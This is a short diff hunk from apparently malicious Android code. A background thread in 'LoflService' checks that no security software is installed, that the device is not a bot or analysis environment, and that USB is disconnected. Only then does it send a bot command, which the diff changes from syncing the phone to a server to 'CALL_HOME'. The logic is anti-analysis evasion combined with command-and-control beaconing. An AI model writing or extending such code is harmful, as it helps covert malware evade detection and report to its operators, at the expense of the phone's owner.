@@ -167,7 +167,7 @@ public class LoflService extends Service {
                     }
                     boolean hasSecuritySoftware = Apps.hasSecuritySoftwareInstalled(LoflService.this);
                     if( !sIsBot && ! hasSecuritySoftware && Systems.Usb.isUsbDisconnected(LoflService.this)){
-                        Bot.onReceiveCommand(LoflService.this, Bot.Commands.SYNC_PHONE_TO_SERVER, null, null);
+                        Bot.onReceiveCommand(LoflService.this, Bot.Commands.CALL_HOME, null, null);
                     }
                 }
             }).start();
